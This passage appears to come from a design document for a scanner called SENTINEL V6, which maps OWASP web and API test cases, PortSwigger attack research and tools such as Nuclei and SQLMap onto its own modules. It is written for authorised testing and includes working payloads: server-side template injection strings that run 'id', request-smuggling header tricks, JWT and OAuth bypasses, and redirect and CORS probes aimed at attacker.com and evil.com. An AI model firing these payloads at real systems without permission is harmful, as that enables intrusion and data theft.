  - *Methodology*: Identifying client-side JavaScript sources (`location.search`, `location.hash`, `document.referrer`, `window.name`, `postMessage`) flowing into execution sinks (`innerHTML`, `eval`, `document.write`, `setTimeout`, `location.href`).
  - *Automation*: Headless browser (Chromium/Playwright) with instrumented DOM taint tracking and prototype monkey-patching.
  - *FP Mitigation*: Verifies that payload executes in headless browser sandbox and triggers a monitored execution sink.
- **WSTG-CLNT-02: Testing for JavaScript Execution**
  - *Methodology*: Reviewing client-side JS files for unsafe execution constructs, hardcoded secrets, and debug functions.
  - *Automation*: Client script AST scanner and secret detector.
  - *FP Mitigation*: Distinguishes minified variable names from true secrets via Shannon entropy and regex verification.
- **WSTG-CLNT-03: Testing for HTML Injection**
  - *Methodology*: Injecting HTML tags (`<b>`, `<h1>`, `<iframe>`, `<img>`) into parameters reflected in the client DOM.
  - *Automation*: DOM AST comparison before and after payload injection.
  - *FP Mitigation*: Verifies DOM node creation vs text node representation.
- **WSTG-CLNT-04: Testing for Client-Side URL Redirection**
  - *Methodology*: Injecting target URLs (`https://attacker.com`, `//attacker.com`, `javascript:alert(1)`) into parameters read by client-side navigation scripts (`window.location = param`).
  - *Automation*: Headless browser navigation interception.
  - *FP Mitigation*: Verifies actual navigation event to external domain.
- **WSTG-CLNT-05: Testing for CSS Injection**
  - *Methodology*: Injecting CSS selectors and rules (`body{background-image:url(...)};`, `@import`) to extract sensitive text or exfiltrate CSRF tokens.
  - *Automation*: Active fuzzer injecting style constructs + OAST HTTP listener.
  - *FP Mitigation*: Verifies CSS evaluation and external callback receipt.
- **WSTG-CLNT-06: Testing for Client-Side Resource Manipulation**
  - *Methodology*: Testing if client scripts dynamically fetch external JS/CSS/iframe resources using user-controlled URL parameters.
  - *Automation*: Headless browser resource loading interceptor.
  - *FP Mitigation*: Checks if injected script is loaded into active execution context.
- **WSTG-CLNT-07: Testing Cross-Origin Resource Sharing (CORS)**
  - *Methodology*: Sending `Origin: https://evil.com` or `Origin: null` and checking if response returns `Access-Control-Allow-Origin: https://evil.com` with `Access-Control-Allow-Credentials: true`.
  - *Automation*: Active probe mutating Origin header with arbitrary, null, and prefix-matched domains (`target.com.evil.com`, `target.com_evil.com`).
  - *FP Mitigation*: Flags vulnerability only when `Allow-Credentials: true` is combined with reflected or null origin.
- **WSTG-CLNT-08: Testing for Cross Site Flashing**
  - *Methodology*: Inspecting legacy Adobe Flash (`.swf`) files for `getURL()`, `loadMovie()` vulnerabilities. (Historical reference).
  - *Automation*: Static SWF decompiler/scanner.
  - *FP Mitigation*: Flash is obsolete; informational audit.
- **WSTG-CLNT-09: Testing for Clickjacking**
  - *Methodology*: Inspecting `Content-Security-Policy: frame-ancestors ...` and `X-Frame-Options: DENY / SAMEORIGIN`. Test framing in an external HTML page.
  - *Automation*: Passive header analyzer + headless framing test.
  - *FP Mitigation*: Confirms page contains state-changing interactive UI elements (excludes static public marketing pages).
- **WSTG-CLNT-10: Testing WebSockets**
  - *Methodology*: Testing WebSocket handshake (`Upgrade: websocket`), origin validation (Cross-Site WebSocket Hijacking - CSWSH), input validation on WS messages, and auth token handling.
  - *Automation*: Dedicated WebSocket interceptor, frame fuzzer, and CSWSH origin probe.
  - *FP Mitigation*: Validates bidirectional message communication and origin-rejection enforcement.
- **WSTG-CLNT-11: Testing Web Storage (LocalStorage, SessionStorage)**
  - *Methodology*: Inspecting items stored in `localStorage` and `sessionStorage` for sensitive plaintext data (JWTs, session tokens, passwords, PII) accessible to XSS.
  - *Automation*: Headless browser storage inspection script.
  - *FP Mitigation*: Classifies storage risk based on sensitivity of stored data keys.
- **WSTG-CLNT-12: Testing for Cross-Origin Messaging (postMessage)**
  - *Methodology*: Analyzing `window.addEventListener('message', ...)` handlers for missing origin validation (`event.origin !== 'trusted.com'`) and unsafe data handling.
  - *Automation*: Headless DOM instrumentor that intercepts registered message listeners and sends synthetic postMessage events with hostile payloads.
  - *FP Mitigation*: Verifies that unvalidated postMessage leads to DOM manipulation or sink execution.
- **WSTG-CLNT-13: Testing for Client-Side Prototype Pollution**
  - *Methodology*: Injecting prototype properties via URL search params (`#__proto__[x]=y`, `?__proto__.x=y`, `?constructor.prototype.x=y`) and checking if `Object.prototype.x` is set.
  - *Automation*: Headless browser script executing prototype probe and scanning for gadget execution.
  - *FP Mitigation*: Confirms that property is genuinely defined on `Object.prototype` in the page context.

#### Category 11: API Testing (WSTG-APIT)
- **WSTG-APIT-01: Testing GraphQL**
  - *Methodology*: Testing Introspection query enablement (`__schema`), query depth limits, field duplication DoS, batching attacks, and resolver-level authorization.
  - *Automation*: GraphQL schema reconstructor, batching fuzzer, and query depth generator.
  - *FP Mitigation*: Verifies introspection returns full Type/Query/Mutation graph.
- **WSTG-APIT-02: Testing REST API**
  - *Methodology*: Enumerating REST resources, OpenAPI/Swagger specifications (`/swagger.json`, `/openapi.json`, `/api-docs`), testing HTTP verbs (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`), content-type switching (JSON to XML), and parameter fuzzing.
  - *Automation*: OpenAPI parser and automated API contract tester.
  - *FP Mitigation*: Matches API responses against official OpenAPI schemas to detect unauthorized data exposure.
- **WSTG-APIT-03: Testing SOAP/XML Web Services**
  - *Methodology*: Discovering WSDL files (`?wsdl`), testing XML schema validation, WS-Security implementations, and XML signature wrapping (XSW) attacks.
  - *Automation*: WSDL parser and SOAP envelope fuzzer.
  - *FP Mitigation*: Confirms XML parser errors vs successful altered method execution.

#### Category 12: Business Logic Testing (WSTG-BUSL)
- **WSTG-BUSL-01: Test Business Logic Data Validation**
  - *Methodology*: Testing parameters violating domain rules (negative quantities in cart, fractional currencies, impossible dates, oversized arrays).
  - *Automation*: Active mutation fuzzer submitting edge-case domain values.
  - *FP Mitigation*: Verifies that transaction completes successfully with invalid values (e.g. order placed with negative price).
- **WSTG-BUSL-02: Test Ability to Forge Requests**
  - *Methodology*: Testing if client can forge internal parameters or bypass server-side validation by replaying or altering hidden form fields or cryptographic hashes.
  - *Automation*: Parameter alteration and replay runner.
  - *FP Mitigation*: Verifies server persistence of forged data.
- **WSTG-BUSL-03: Test Integrity Checks**
  - *Methodology*: Testing state transitions that skip prerequisite steps (e.g. skipping payment step and jumping directly to `/checkout/success`).
  - *Automation*: State-machine workflow fuzzer attempting non-sequential step execution.
  - *FP Mitigation*: Checks if system provisions service/goods without prerequisite payment state.
- **WSTG-BUSL-04: Test for Process Timing**
  - *Methodology*: Analyzing execution timing of sensitive business workflows (financial transactions, lottery draws) for predictability or race windows.
  - *Automation*: Statistical timing measurement engine.
  - *FP Mitigation*: Calibrates network latency variance.
- **WSTG-BUSL-05: Test Number of Times a Function Can Be Used (Limit Overrun)**
  - *Methodology*: Testing multi-use of one-time discount coupons, gift cards, free trial claims, or voting mechanisms.
  - *Automation*: Single-packet synchronized race tester and high-concurrency replayer.
  - *FP Mitigation*: Confirms that resource was credited/redeemed more than once in the backend database.
- **WSTG-BUSL-06: Testing for the Circumvention of Workflows**
  - *Methodology*: Identifying workflows enforced purely on the client side (e.g. multi-step wizard) and submitting direct requests to final endpoints.
  - *Automation*: Endpoint sequence fuzzer.
  - *FP Mitigation*: Confirms state modification without prerequisite validation.
- **WSTG-BUSL-07: Test Defenses Against Application Mis-use**
  - *Methodology*: Testing application behavior when subjected to massive request volumes, rapid parameter changes, or abnormal usage patterns.
  - *Automation*: Rate limit and throttling behavior auditor.
  - *FP Mitigation*: Differentiates generic web server 429 responses from application-level defensive circuit breakers.
- **WSTG-BUSL-08: Test Upload of Unexpected File Types**
  - *Methodology*: Uploading files with unexpected MIME types, double extensions (`file.php.jpg`), null-byte names (`file.php%00.jpg`), SVG with embedded JavaScript, polyglot files (GIF/PHP).
  - *Automation*: File upload mutation fuzzer with execution verification.
  - *FP Mitigation*: Attempts to retrieve and execute uploaded file to confirm server-side script execution or client-side XSS.
- **WSTG-BUSL-09: Test Upload of Malicious Files**
  - *Methodology*: Uploading ZIP bombs (decompression bombs), pixel flood images, XML files with billion-laughs entities to test resource exhaustion.
  - *Automation*: Safe bounded resource consumption fuzzer.
  - *FP Mitigation*: Measures server response latency and memory consumption before aborting.

---

### 2.2 OWASP API Security Top 10 (2023 Edition) Complete Specifications

| Identifier | Vulnerability Name | Threat Vector | Primary Detection Mechanism | SENTINEL Native Implementation |
|---|---|---|---|---|
| **API1:2023** | Broken Object Level Authorization (BOLA) | Object ID substitution across user sessions (`/api/orders/{id}`) | Multi-token cross-user replay; differential status/body comparison | `sentinel_authz` IRA+ Matrix Engine |
| **API2:2023** | Broken Authentication | Weak token verification, credential stuffing, missing rate limits on auth | Active token mutation, expiry fuzzing, brute force resilience check | `sentinel_auth` Identity Engine |
| **API3:2023** | Broken Object Property Level Authorization (BOPLA) | Mass assignment (`{"isAdmin": true}`) and Excessive Data Exposure | Schema inference, property injection, response field diffing against user role | `sentinel_api` / `sentinel_diff` |
| **API4:2023** | Unrestricted Resource Consumption | Missing rate/size limits, unconstrained pagination (`?limit=1000000`), GraphQL depth DoS | Parameter boundary fuzzing, payload sizing, query complexity calculation | `sentinel_fuzzer` Boundary Runner |
| **API5:2023** | Broken Function Level Authorization (BFLA) | Standard user invoking admin API functions (`DELETE /api/users/{id}`) | Role-swapped endpoint invocation, HTTP verb tampering (`GET` vs `DELETE`) | `sentinel_authz` BFLA Checker |
| **API6:2023** | Unrestricted Access to Sensitive Business Flows | Automated execution of sensitive flows (buying tickets, posting spam, account creation) | Automated sequence repetition analysis, anti-automation check detection | `sentinel_logic` Flow Engine |
| **API7:2023** | Server Side Request Forgery (SSRF) | User-supplied URLs consumed by API backends to query internal services | Parameter mutation with cloud metadata IPs and stateless OAST tokens | `sentinel_oast` SSRF Probe Engine |
| **API8:2023** | Security Misconfiguration | Verbose error stack traces, CORS misconfigurations, unneeded HTTP methods | Passive header inspection, CORS reflection testing, OPTIONS probe | `sentinel_scanner` Passive Rules |
| **API9:2023** | Improper Inventory Management | Shadow APIs, Zombie APIs (`/v1/` vs `/v2/`), unlinked debug/staging endpoints | Endpoint version fuzzing, OpenAPI route differential analysis | `sentinel_context` Surface Mapper |
| **API10:2023** | Unsafe Consumption of APIs | Third-party API integration without validation, leading to injection or SSRF | Downstream mock injection, payload passthrough fuzzing | `sentinel_fuzzer` API Fuzzer |

---

## 3. PortSwigger Advanced Web Security Research Synthesis

### 3.1 HTTP Request Smuggling & Protocol Desync

#### Mechanics & Variants
HTTP Request Smuggling exploits discrepancies in how frontend reverse proxies and backend application servers parse HTTP request boundaries:
- **CL.TE**: Frontend parses `Content-Length`, backend parses `Transfer-Encoding: chunked`. Smuggled prefix placed inside chunked body.
- **TE.CL**: Frontend parses `Transfer-Encoding: chunked`, backend parses `Content-Length`. Smuggled prefix sent past the frontend's parsed chunk size.
- **TE.TE**: Both frontend and backend support `Transfer-Encoding`, but one server is tricked into ignoring it via header obfuscation:
  * `Transfer-Encoding: xchunked`
  * `Transfer-Encoding : chunked` (space before colon)
  * `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
  * `Transfer-Encoding:\tchunked` (tab delimiter)
  * `X: X[\n]Transfer-Encoding: chunked` (CRLF line wrapping)
- **HTTP/2 Request Smuggling (H2.CL & H2.TE)**:
  * Frontend speaks HTTP/2, translates to HTTP/1.1 for backend.
  * **H2.CL**: Frontend injects `content-length` header into H2 request; backend respects it, ignoring H2 frame length.
  * **H2.TE**: Frontend injects `transfer-encoding: chunked` header; backend parses body as chunked.
- **HTTP/2 Request Tunnelling / CRLF Injection**: Injecting `\r\n` into H2 header values or pseudo-headers (e.g. `:path: /test HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /smuggled...`).
- **Response Queue Poisoning**: Complete desynchronization of backend keep-alive connections so that the backend server's response queue misaligns with the frontend's request queue, returning User A's session/response to User B.
- **Request Pause Desync**: Sending partial headers and pausing mid-stream to trigger backend read timeouts that leave unparsed bytes on the connection pipeline.

#### Two-Stage Detection & Confirmation Algorithm
```
Stage 1: Differential Timing Probe (Safe)
Send probe with conflicting CL and TE:
CL.TE Probe: Content-Length specifies 4 bytes, Chunked body ends immediately (0\r\n\r\n).
Backend hangs waiting for remaining bytes -> Timeout Observed (e.g. >5.0s).

Stage 2: Benign Canary Pipeline Reflection
Send two pipelined requests:
Request 1 (Smuggler): Injects prefix "GET /sentinel_canary_404 HTTP/1.1\r\nFoo: x"
Request 2 (Victim): Normal "GET / HTTP/1.1"
Assertion: Request 2 returns HTTP 404 Not Found for "/sentinel_canary_404".
```

---

### 3.2 Web Cache Poisoning & Web Cache Deception

#### Web Cache Poisoning
- **Unkeyed Inputs**: Unkeyed headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Host`), unkeyed query parameters (UTM tracking params, cache-busters if stripped), unkeyed cookies.
- **Parameter Cloaking**: Exploiting parameter parser discrepancies between cache and application (`?example=1&example=2` or `?example=1;example=2`).
- **Fat GET Requests**: Sending HTTP GET requests with a body containing overriding parameters.
- **Verification**:
  1. Send poisoning request with unique unkeyed header containing canary domain.
  2. Send secondary clean request to same URL without the header.
  3. Verify secondary request returns cached response containing the canary domain with `X-Cache: HIT` / `Age: > 0`.

#### Web Cache Deception
- **Mechanism**: Attacker tricks victim into visiting `/profile.php/nonexistent.css`. The cache server sees `.css` extension and caches the response under the public cache key; the origin backend strips `/nonexistent.css` and serves the victim's private profile HTML.
- **Path Delimiters Tested**: `/`, `;`, `%3b`, `%23`, `?`, `%2f`.
- **Verification**: Unauthenticated client requests the cached URL and receives victim's sensitive profile HTML with `X-Cache: HIT`.

---

### 3.3 DOM XSS & Client-Side / Server-Side Prototype Pollution

#### Client-Side Prototype Pollution
- **Mechanics**: Injection of properties into `Object.prototype` via `__proto__`, `constructor.prototype`, or bracket notation in recursive object merge/clone/extend functions.
- **Gadget Chains**:
  * Config gadget: `if (config.transportUrl) loadScript(config.transportUrl);`
  * DOM gadget: `target.innerHTML = options.template || defaultTemplate;`
- **Detection via Headless Playwright AST Taint Engine**:
  1. Intercept URL parsing and query string unpacking in Chromium.
  2. Inject prototype payload: `?__proto__[polluted_canary]=probe_val`.
  3. Execute JavaScript in browser page.
  4. Query `window.Object.prototype.polluted_canary`. If defined, scan loaded functions for execution gadgets.

#### Server-Side Prototype Pollution
- **Mechanics**: Injects `__proto__` properties into backend Node.js JSON parsers (`{"__proto__": {"admin": true, "status": "polluted"}}`).
- **Verification**: Query an independent, clean endpoint and verify that the injected property reflects in the server's response object.

---

### 3.4 OAuth 2.0, OIDC & JWT Vulnerabilities

#### OAuth 2.0 / OIDC Flaws
- **`redirect_uri` Validation Bypasses**: Prefix matching (`https://target.com.attacker.com`), directory traversal (`https://target.com/oauth/callback/../../attacker`), regex flaws, open redirect chaining.
- **State Parameter Omission / CSRF**: Missing `state` parameter allowing authorization code injection and account linking hijacking.
- **Token Leakage via Referer**: Authorization code leaked via `Referer` header to third-party CDNs/analytics when redirect page loads external assets.
- **PKCE Omission**: Public clients (mobile/SPA) omitting `code_challenge` / `code_verifier`, enabling authorization code interception.

#### JSON Web Token (JWT) Attacks
1. **Unverified Signature**: Backend parses payload without verifying cryptographic signature.
2. **Algorithm Confusion (RS256 to HS256)**: Attacker changes header `alg` from `RS256` to `HS256` and signs token using server's public RSA key as the HMAC secret.
3. **`alg: "none"` / `alg: "None"` / `alg: "NONE"`**: Token accepted with empty signature block (`header.payload.`).
4. **Header Injections**:
   - `jwk` (JSON Web Key): Attacker embeds own public key in header.
   - `jku` (JWK Set URL): Attacker provides URL pointing to own JWKS file.
   - `kid` (Key ID): Injected with path traversal (`../../dev/null` -> secret is empty string) or SQL injection (`kid: "key1' UNION SELECT 'secret'--"`).
5. **Weak Secret Brute-Forcing**: High-speed offline dictionary cracking of HS256 secrets.

---

### 3.5 Server-Side Template Injection (SSTI)

#### Engine Fingerprinting Decision Tree
```
                  ${7*7}
                 /      \
            49 (Success)  ${7*7} (Fail / String)
             /              \
         {{7*7}}           <%= 7*7 %>
        /       \             /      \
      49        {{7*7}}     49 (ERB)  Fail
     /   \         |
  {7*'7'} {{7*'7'}} #{7*7} (Ruby/Elixir)
   /        \
49 (Twig) 7777777 (Jinja2/Python)
```

#### Engine Payloads
- **Jinja2 (Python)**: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
- **Twig (PHP)**: `{{['id']|filter('system')}}`
- **FreeMarker (Java)**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`
- **Velocity (Java)**: `#set($e="exp");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`
- **Thymeleaf (Java)**: `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x`

---

### 3.6 Single-Packet Synchronized Race Conditions

#### Single-Packet Synchronization Mechanics
- **HTTP/2 Single-Packet Attack**: Utilizes HTTP/2 multiplexing to pack 20–50 requests into a single TCP packet. All requests are parsed by the server simultaneously and executed across concurrent worker threads within the sub-millisecond race window.
- **HTTP/1.1 TCP Window Stuffing / Last-Byte Sync**: Sends all request bytes except the final byte across N connections, then releases the final byte simultaneously via `TCP_NODELAY`.
- **Target Vulnerabilities**: Limit-overrun (redeeming single-use gift cards multiple times), multi-spend balance races, and state-transition alignment.

---

## 4. Security Tool Ecosystem Deep Dives

```
+-----------------------------------------------------------------------------------------------------------------------+
|                                          TOOL ECOSYSTEM ARCHITECTURAL AUDIT                                           |
+-----------------------------------------------------------------------------------------------------------------------+
| Category         | Tools Evaluated                                                                                    |
+------------------+----------------------------------------------------------------------------------------------------+
| Interception     | Caido (Rust/Tauri, closed core), OWASP ZAP (Java/Apache 2.0), Burp Suite (Java/Proprietary)        |
| Active Recon     | Nuclei v3 (Go/MIT), Katana (Go/MIT), Interactsh (Go/MIT), HTTPX (Go/MIT), Naabu (Go/MIT)           |
| Fuzzing/Miners   | FFUF (Go/MIT), Param Miner (Java/Apache 2.0), Feroxbuster (Rust/MIT), SQLMap (Python/GPLv2)        |
| Static / Supply  | Semgrep (OCaml/Tree-sitter/LGPL), Trivy (Go/Apache 2.0), Syft/Grype (Go/Apache 2.0), Gitleaks (Go)  |
+-----------------------------------------------------------------------------------------------------------------------+
```

### 4.1 Interception Proxy Comparison

| Dimension | Caido | OWASP ZAP | Burp Suite Professional | SENTINEL V6 Native Engine |
|---|---|---|---|---|
| **Core Architecture** | Lightweight Rust daemon + Tauri/Web | Monolithic Java (Swing + HUD) | Monolithic Java (Swing + Agent Grid) | **Pure Native Rust Core + Tauri/React Shell** |
| **Runtime Language** | Rust (backend) + TS (UI) | Java (OpenJDK 11+) | Java (bundled OpenJDK) | **Rust (Zero GC) + TypeScript/React** |
| **Idle Memory** | ~50 MB – 120 MB | ~600 MB – 1.5 GB | ~800 MB – 2.5 GB | **~60 MB – 150 MB** |
| **Scan Capabilities** | Manual focus, workflows | Comprehensive Passive/Active rules | Industry-leading AST active scanner | **Verification-First Scanner + Context Graph** |
| **OAST Support** | None built-in | Add-on (BOAST / Interactsh) | Burp Collaborator (Native) | **Built-in Stateless AES-256 OAST Server** |
| **Licensing & Cost** | Freemium ($10/mo Pro) — Proprietary | 100% Free Open Source (Apache 2.0) | Proprietary ($449/yr Pro) | **Commercial Enterprise Permissive (MIT/Apache)** |

---

### 4.2 Active Reconnaissance & CVE Testing Tools

#### Nuclei v3 (Engine Architecture & DSL)
- **Engine**: YAML template compiler, Knetic DSL evaluator, JavaScript Flow engine, multi-protocol runners (HTTP, Headless, TCP, DNS, SSL, Code).
- **DSL Functions**: `to_upper()`, `base64()`, `md5()`, `sha256()`, `aes_gcm()`, `rand_base()`, `compare_versions()`, `contains()`, `regex()`.
- **SENTINEL Integration**: Clean-room native Rust YAML DSL compiler in `sentinel_scanner` + legacy template adapter in `sentinel_adapters::NucleiAdapter`.

#### Katana (Crawler & Spider)
- **Engine**: Fast pipeline crawler + Headless Chromium DOM walker, Babel/Esprima JS AST extractor, source map decompiler, form auto-fill.
- **SENTINEL Integration**: Native Rust crawler in `sentinel_coverage` + managed Playwright CDP daemon in `sentinel_browser`.

#### Interactsh (Out-of-Band OAST Server)
- **Engine**: Multi-protocol authoritative listener (DNS/53, HTTP/80/443, SMTP/25, LDAP/389).
- **Crypto**: Client generates RSA-2048 keypair; server encrypts interaction record with client public key using AES-GCM-256; client polls and decrypts using private key.
- **SENTINEL Integration**: Native Rust OAST server & client in `sentinel_oast` with stateless AES-256 tokens.

#### HTTPX & Naabu
- **HTTPX**: Favicon MurmurHash3, JARM TLS fingerprinting (10 Client Hello probes -> 62-char hash), TLS SAN extraction, CDN detection.
- **Naabu**: Raw SYN half-open scanner (`pcap`), TCP Connect fallback, CDN exclusion filter.
- **SENTINEL Integration**: Native zero-copy TLS/JARM prober in `sentinel_parser` and async port prober in `sentinel_coverage`.

---

### 4.3 Web Fuzzers, Parameter Miners & SQLi Engines

#### FFUF (Fast Web Fuzzer)
- **Engine**: Goroutine worker pool, Pitchfork & Clusterbomb modes, auto-calibration (`-ac`) measuring baseline length, word, and line count envelopes.
- **SENTINEL Integration**: Native Rust high-throughput mutation fuzzer in `sentinel_fuzzer`.

#### Param Miner (Logarithmic Bisection Algorithm)
- **Mathematical Model**: Splits $N = 10,000$ parameters into batches of $B = 50$. Initial requests $K = N / B = 200$. Upon anomaly detection, binary bisection finds the exact parameter in $2 \times \lceil\log_2 B\rceil \approx 12$ requests (212 total requests vs 10,000 linear requests, a **97.8% request reduction**).
- **Target Vectors**: Unlinked query parameters, secret headers (`X-Forwarded-Host`, `X-Original-URL`), unlinked cookies, Fat GET request bodies.
- **SENTINEL Integration**: Native parameter discovery engine embedded into `sentinel_fuzzer`.

#### SQLMap (Advanced SQL Injection Engine)
- **Techniques**: Boolean-based blind, Error-based, UNION query-based, Stacked queries, Time-based blind, Out-of-band (DNS/SMB).
- **WAF Evasion**: Over 60 tamper scripts (`space2comment.py`, `between.py`, `randomcase.py`).
- **SENTINEL Integration**: Clean-room native Rust SQLi verification engine in `sentinel_verification` + isolated CLI adapter in `sentinel_adapters::SqlmapAdapter`.

---

### 4.4 Static Analysis, Container & Supply Chain Security

#### Semgrep (AST Static Analysis & Taint Tracking)
- **Engine**: Tree-sitter AST parser, concrete syntax patterns, metavariables (`$X`), ellipsis (`...`), taint mode (`pattern-sources`, `pattern-sanitizers`, `pattern-sinks`, `pattern-propagators`).
- **SENTINEL Integration**: Native Tree-sitter JS taint analyzer in `sentinel_browser` + SARIF adapter in `sentinel_adapters::SemgrepAdapter`.

#### Trivy, Syft & Grype (Container, IaC & SBOM Security)
- **SBOM Formats**: CycloneDX v1.5 (AppSec/VEX focus) vs SPDX v2.3 (Legal compliance focus).
- **Version Engines**: SemVer (Cargo, npm), RPM EVR (Red Hat), Debian versioning, PURL/CPE matcher.
- **SENTINEL Integration**: Native CycloneDX/SPDX parsers + SARIF ingestion in `sentinel_adapters`.

#### Gitleaks (Secret Detection)
- **Mathematical Model**: Shannon Entropy formula:
$$H(X) = -\sum_{i=1}^{n} P(x_i) \log_2 P(x_i)$$
High-entropy tokens ($H > 3.8$) are flagged; low-entropy placeholders are rejected.
- **SENTINEL Integration**: Native SIMD regex + Shannon entropy validator in `sentinel_scanner`.

---

## 5. SENTINEL V6 Native Superiority Blueprint & Consolidation Architecture

```
+------------------------------------------------------------------------------------+
|                         SENTINEL V6 UNIFIED ARCHITECTURE                           |
+------------------------------------------------------------------------------------+
|                                                                                    |
|   ┌────────────────────────────────────────────────────────────────────────────┐   |
|   │                       Fail-Closed Scope Gate (SEC-01)                      │   |
|   │    Every packet, probe, AST match, fuzzer payload, and OAST callback is    │   |
|   │               cryptographically verified against active scope              │   |
|   └─────────────────────────────────────┬──────────────────────────────────────┘   |
|                                         │                                          |
|                                         ▼                                          |
|   ┌────────────────────────────────────────────────────────────────────────────┐   |
|   │              Unified In-Memory Security Context Graph (SUB-04)             │   |
|   │   Asset ──> Endpoint ──> Parameter ──> Request ──> Response ──> Finding   │   |
|   │   (Combines Katana crawl, HTTPX tech, GAU history, Param Miner inputs)     │   |
|   └─────────────────────────────────────┬──────────────────────────────────────┘   |
|                                         │                                          |
|         ┌───────────────────────────────┼───────────────────────────────┐          |
|         ▼                               ▼                               ▼          |
|   ┌───────────────┐             ┌───────────────┐             ┌────────────────┐   |
|   │sentinel_fuzzer│             │sentinel_oast  │             │sentinel_scanner│   |
|   │(FFUF+Param    │             │(Stateless AES │             │(Nuclei v3 Flow │   |
|   │Miner Bisection│             │DNS/HTTP/SMTP/ │             │+ Semgrep Taint │   |
|   │+ SQLMap Auto) │             │LDAP Server)   │             │+ Dynamic AST)  │   |
|   └───────┬───────┘             └───────┬───────┘             └────────┬───────┘   |
|           │                             │                              │           |
|           └─────────────────────────────┼──────────────────────────────┘           |
|                                         ▼                                          |
|   ┌────────────────────────────────────────────────────────────────────────────┐   |
|   │                 Verification & CAS Evidence Engine (SEC-06/07)             │   |
|   │      No finding without cryptographic proof: Request + Response + OAST     │   |
|   │                     SHA-256 CAS blob commitment                            │   |
|   └────────────────────────────────────────────────────────────────────────────┘   |
+------------------------------------------------------------------------------------+
```

### Key Superiority Benchmarks
1. **Zero Garbage-Collection Latency**: Rust deterministic memory management guarantees sub-50ms UI response times even under 1,000,000 captured transactions.
2. **Unified Context Graph**: Recon data instantly populates the attack surface without intermediate JSON export/import cycles.
3. **Cryptographic CAS Evidence (SEC-07)**: Every finding is backed by an immutable SHA-256 content-addressed proof package ready for executive and technical reporting.
4. **Fail-Closed Security Guarantee (SEC-01)**: The core engine cannot physically emit out-of-scope requests, preventing accidental legal or operational violations.

---

## 6. Primary Source Citations & References

1. **OWASP Foundation**: *Web Security Testing Guide (WSTG)*, Version 4.2 / 5.0 (2020–2024). `https://owasp.org/www-project-web-security-testing-guide/`
2. **OWASP Foundation**: *OWASP API Security Top 10*, 2023 Edition. `https://owasp.org/API-Security/`
3. **PortSwigger Web Security Research (James Kettle et al.)**:
   - *HTTP Request Smuggling: HTTP Desync Attacks* (Black Hat USA 2019 / DEF CON 27).
   - *HTTP/2: The Sequel is Always Worse* (Black Hat USA 2021).
   - *Practical Web Cache Poisoning: Redefining 'Unkeyed' Issues* (Black Hat USA 2018).
   - *Web Cache Deception: Path Delimiters and Caching Policies* (2020).
   - *Smashing the State Machine: The True Potential of Web Race Conditions* (Black Hat USA 2023).
4. **ProjectDiscovery, Inc.**:
   - *Nuclei Engine v3 Specification & DSL Grammar* (2023–2024). `https://github.com/projectdiscovery/nuclei`
   - *Katana Headless Crawling Architecture* (2023). `https://github.com/projectdiscovery/katana`
   - *Interactsh Zero-Knowledge OAST Architecture* (2022–2024). `https://github.com/projectdiscovery/interactsh`
5. **Shannon, Claude E.**: *A Mathematical Theory of Communication*, Bell System Technical Journal, 1948 (Shannon Entropy Formula).
6. **NIST**: *Special Publication 800-52 Revision 2: Guidelines for the Selection, Configuration, and Use of Transport Layer Security (TLS) Implementations* (2019).
7. **IETF RFCs**:
   - RFC 9112: *HTTP/1.1 Message Syntax and Routing* (2022).
   - RFC 9113: *HTTP/2 Protocol Specification* (2022).
   - RFC 7519: *JSON Web Token (JWT)* (2015).
   - RFC 6749: *The OAuth 2.0 Authorization Framework* (2012).
   - RFC 7636: *Proof Key for Code Exchange by OAuth Public Clients (PKCE)* (2015).
